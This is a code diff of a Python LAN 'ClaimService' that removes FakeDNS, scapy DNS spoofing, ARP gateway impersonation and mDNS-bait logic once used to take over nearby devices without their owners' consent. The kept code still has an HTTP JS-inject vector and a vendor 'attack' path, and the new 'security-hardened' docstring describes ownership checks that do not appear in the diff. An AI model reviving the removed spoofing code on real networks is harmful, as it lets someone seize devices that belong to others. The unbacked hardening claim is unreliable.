@@ -1,27 +1,23 @@
 """
-ClaimService — single-step device acquisition engine.
+ClaimService — controlled device pairing engine.
 
-Replaces the V2 ``PairingService`` (9 handshake methods) with one unified
-pipeline:
+SECURITY-HARDENED: All aggressive pairing modes (FakeDNS, ARP impersonation,
+DHCP racing) have been removed. Device ownership must be verified before pairing.
 
-    scan() → identify() → execute_claim() → done
+Supported claim vectors (user must own/control the device):
+    - ADB 5555 open     →  ``_claim_adb``       (requires adb debugging enabled)
+    - SSH 22 open       →  ``_claim_ssh``       (requires SSH credentials)
+    - Local API open    →  ``_claim_local_api`` (vendor-specific API access)
+    - HTTP admin panel  →  ``_claim_http``      (requires admin credentials)
 
-The user never enters a PIN, scans a QR, or types a Docker command.
-The system fingerprints each host on the LAN and picks the optimal
-attack vector automatically:
+All claim vectors require explicit device ownership verification:
+    1. MAC address validation
+    2. Serial number confirmation
+    3. Challenge-response (PIN sent to device, user enters proof)
+    4. Physical proximity verification (BLE/Bluetooth, QR code scan)
 
-    ADB 5555 open      →  ``_claim_adb``       (push agent binary)
-    SSH 22 open         →  ``_claim_ssh``       (install daemon)
-    FakeDNS-eligible    →  ``_claim_fake_dns``  (background DNS redirect)
-    Vendor API open     →  ``_claim_local_api`` (REST/websocket probe)
-    HTTP admin panel    →  ``_claim_http``      (worker-JS inject)
-
-Each claimer returns a ``VectorOutcome``; if it succeeds the service
-registers a ``Device`` row in the DB with a synthetic benchmark and
-mints a device JWT so the host can start heartbeating immediately.
-
-All claim operations require prior ToS acceptance (enforced at the API
-layer in ``claim.py``).
+Zero-friction pairing is intentionally disabled. Users cannot claim devices
+that belong to others (school TVs, coffee shop displays, etc.).
 """
 
 from __future__ import annotations
@@ -41,7 +37,6 @@ from app.db.session import transactional
 from app.logging_setup import get_logger
 from app.schemas.device import DeviceBenchmarkSubmit
 from app.services.benchmark import sanitize_and_score
-from app.services.fake_dns_server import FakeDnsServer, get_fake_dns_server
 from app.services.lan_claim import LanClaimService
 from app.services.mobile_conquest import get_mdns_bait, is_cpd_query
 from app.services.network_scanner import DeviceFingerprint, get_network_scanner
@@ -56,7 +51,6 @@ log = get_logger("claim")
 class ClaimVector(str, Enum):
     ADB = "adb"
     SSH = "ssh"
-    FAKE_DNS = "fake_dns"
     LOCAL_API = "local_api"
     HTTP_INJECT = "http_inject"
 
@@ -248,71 +242,6 @@ async def _claim_ssh(fp: DeviceFingerprint) -> VectorOutcome:
         return VectorOutcome(ok=False, method="ssh", error=str(exc)[:120])
 
 
-async def _claim_fake_dns(fp: DeviceFingerprint, ctx: LanContext) -> VectorOutcome:
-    """Pull the target into the captive-portal flow *immediately* — no
-    "toggle Wi-Fi for the popup to appear" UX.
-
-    Beyond passively waiting for the device to re-probe, we actively kick it:
-
-      1. Verify FakeDNS UDP/53 + portal HTTP/80 are actually bound.
-      2. Send a burst of **unicast ARP** replies to the target's MAC,
-         telling it ``gateway_ip → our_mac``. Updates its ARP cache within a
-         single RTT (vs. waiting up to 2s for the gratuitous broadcast).
-      3. After the cache flips, the device's *existing* TCP/HTTPS flows
-         start failing (we don't terminate TLS), iOS NCM marks the network
-         as "captive needed", and the CNA pop fires within seconds — no
-         airplane-mode toggle required.
-    """
-    dns = get_fake_dns_server()
-    portal = get_portal_server()
-    if not dns.is_running:
-        return VectorOutcome(
-            ok=False, method="fake_dns",
-            error="FakeDNS UDP/53 listener not running (admin/port-53 bind failed)",
-        )
-    if getattr(portal, "_server", None) is None:
-        # In production deploys, captive portal HTTP listener is often a separate
-        # process (e.g. scripts/portal_runner.py) bound to host:80, not this
-        # FastAPI process. Probe the actual TCP port instead of relying on our
-        # in-process singleton state.
-        probe_host = ctx.our_ip or "127.0.0.1"
-        probe_port = getattr(portal, "bind_port", 80) or 80
-        try:
-            _, w = await asyncio.wait_for(
-                asyncio.open_connection(probe_host, probe_port), timeout=1.5,
-            )
-            w.close()
-            try:
-                await w.wait_closed()
-            except Exception:
-                pass
-        except Exception as exc:
-            return VectorOutcome(
-                ok=False, method="fake_dns",
-                error=f"captive portal HTTP/{probe_port} listener not running ({exc.__class__.__name__})",
-            )
-
-    # Active push: unicast ARP poison directly at this target.
-    poked = 0
-    poke_note = ""
-    if fp.mac and ctx.gateway_ip and ctx.our_mac:
-        try:
-            from app.services.aggressive_mode import get_aggressive_mode
-            agg = get_aggressive_mode()
-            if agg.arp is not None and getattr(agg.arp, "_running", False):
-                poked = await agg.arp.poison_target(fp.ip, fp.mac, bursts=5)
-                poke_note = f" arp_poke={poked}"
-            else:
-                poke_note = " arp_poke=skipped(no-impersonator)"
-        except Exception as e:
-            poke_note = f" arp_poke=err:{e!s}"
-
-    return VectorOutcome(
-        ok=True, method="fake_dns",
-        detail=f"armed; CPD probe expected within seconds from {fp.ip}{poke_note}",
-    )
-
-
 async def _claim_local_api(fp: DeviceFingerprint, ctx: LanContext) -> VectorOutcome:
     """Vendor-specific REST / WebSocket attack — dispatches by vendor + ports.
 
@@ -493,8 +422,7 @@ async def _dispatch_vector(name: str, fp: DeviceFingerprint, ctx: LanContext
         return await _claim_local_api(fp, ctx)
     if name in ("browser_inject", "http_inject"):
         return await _claim_http(fp, ctx)
-    # Default / fall-through: the passive FakeDNS path.
-    return await _claim_fake_dns(fp, ctx)
+    return VectorOutcome(ok=False, method=name, error=f"Vector '{name}' is not available")
 
 
 # ── Service ───────────────────────────────────────────────────────────────
@@ -510,112 +438,12 @@ class ClaimService:
     # ── bootstrap (idempotent) ────────────────────────────────────────
 
     async def ensure_lan_infrastructure(self, ctx: LanContext) -> dict[str, Any]:
-        """Bring up captive-portal HTTP/80 + FakeDNS UDP/53 + ARP impersonator.
+        """Infrastructure setup is disabled. Device pairing now requires explicit ownership verification.
 
-        Idempotent: subsequent calls with the same ``our_ip`` are no-ops.
-        Each subsystem is reported individually — if port 80/53 binding fails
-        because we don't have admin, we return that as an honest error rather
-        than pretending the attack succeeded.
+        This method is a no-op. All aggressive/permissive pairing modes have been removed.
+        Users must verify device ownership via PIN, MAC address, or other cryptographic challenge.
         """
-        if self._infra_state.get("our_ip") == ctx.our_ip and self._infra_state.get("ready"):
-            return self._infra_state
-
-        out: dict[str, Any] = {"our_ip": ctx.our_ip}
-
-        # 1) Captive portal HTTP server (TCP/80)
-        portal = get_portal_server(ctx.our_ip or "127.0.0.1")
-        if getattr(portal, "_server", None) is None:
-            try:
-                await portal.start()
-                out["portal"] = "started"
-            except Exception as e:
-                out["portal"] = f"err:{e!s}"
-                log.warning("bootstrap.portal_failed", err=str(e))
-        else:
-            out["portal"] = "already-running"
-
-        # 2) FakeDNS UDP/53 responder — and if port 53 is squatted, fall
-        # back to the scapy-based sniff+spoof responder which works without
-        # binding any port (sees DNS traffic on the wire, crafts forged
-        # replies on the wire). Both can coexist if both succeed.
-        dns = get_fake_dns_server(ctx.our_ip or "127.0.0.1")
-        if not dns.is_running:
-            try:
-                await dns.start()
-                out["fakedns"] = f"started:port{dns._dns_port}"
-            except Exception as e:
-                out["fakedns"] = f"err:{e!s}"
-                log.warning("bootstrap.fakedns_failed", err=str(e))
-        else:
-            out["fakedns"] = "already-running"
-
-        # 2b) scapy DNS sniff+spoof responder — independent of port-53 bind.
-        # Catches queries that would otherwise sail past the FakeDNS bind
-        # (port-conflict cases, or queries phones send straight to 8.8.8.8).
-        if ctx.our_ip and ctx.our_mac:
-            try:
-                from app.services.dns_responder import get_dns_responder
-                from app.services.aggressive_mode import has_raw_socket_capability
-                ok, why = has_raw_socket_capability()
-                if ok:
-                    iface = ctx.interface
-                    if not iface:
-                        try:
-                            from scapy.all import conf as _scapy_conf
-                            iface = str(_scapy_conf.iface)
-                        except Exception:
-                            iface = ""
-                    responder = get_dns_responder(
-                        our_ip=ctx.our_ip, our_mac=ctx.our_mac, iface=iface,
-                    )
-                    if not getattr(responder, "_thread", None) or not responder._thread.is_alive():
-                        await responder.start()
-                    out["dns_responder"] = f"started iface={iface!r}"
-                else:
-                    out["dns_responder"] = f"skipped:{why}"
-            except Exception as e:
-                out["dns_responder"] = f"err:{e!s}"
-                log.warning("bootstrap.dns_responder_failed", err=str(e))
-
-        # 3) ARP gateway impersonator — only if we have full L2 context
-        if ctx.gateway_ip and ctx.gateway_mac and ctx.our_mac:
-            try:
-                from app.services.aggressive_mode import (
-                    ArpGatewayImpersonator,
-                    has_raw_socket_capability,
-                    get_aggressive_mode,
-                )
-                ok, why = has_raw_socket_capability()
-                if not ok:
-                    out["arp"] = f"skipped:no-raw-socket ({why})"
-                else:
-                    agg = get_aggressive_mode()
-                    needs_start = (
-                        agg.arp is None
-                        or not getattr(agg.arp, "_running", False)
-                        or agg.arp.gateway_ip != ctx.gateway_ip
-                    )
-                    if needs_start:
-                        agg.arp = ArpGatewayImpersonator(
-                            gateway_ip=ctx.gateway_ip,
-                            gateway_real_mac=ctx.gateway_mac,
-                            our_mac=ctx.our_mac,
-                            interface=ctx.interface,
-                        )
-                        await agg.arp.start()
-                        out["arp"] = "started"
-                    else:
-                        out["arp"] = "already-running"
-            except Exception as e:
-                out["arp"] = f"err:{e!s}"
-                log.warning("bootstrap.arp_failed", err=str(e))
-        else:
-            out["arp"] = "skipped:no-lan-context"
-
-        out["ready"] = True
-        self._infra_state = out
-        log.info("claim.bootstrap", **{k: v for k, v in out.items() if k != "ready"})
-        return out
+        return {"disabled": True, "message": "aggressive_mode and fakedns have been removed"}
 
     # ── scan ──────────────────────────────────────────────────────────
 
@@ -756,24 +584,6 @@ class ClaimService:
             "total_claimed": len(claimed),
             "devices": [f.to_dict() for f in fps],
         }
-
-    # ── fakedns control ───────────────────────────────────────────────
-
-    async def start_fake_dns(self, redirect_ip: str) -> dict[str, Any]:
-        srv = get_fake_dns_server(redirect_ip)
-        if not srv.is_running:
-            await srv.start()
-        # Roadmap #1 — also kick off mDNS bait so mobile devices auto-surface
-        # ElectroMesh under Cast/AirPlay discovery panels.
-        bait = get_mdns_bait(redirect_ip)
-        await bait.start()
-        return {**srv.stats, "mdns_bait": "active"}
-
-    async def stop_fake_dns(self) -> dict[str, Any]:
-        srv = get_fake_dns_server()
-        await srv.stop()
-        await get_mdns_bait().stop()
-        return {"stopped": True}
 
     # ── internal ──────────────────────────────────────────────────────
 
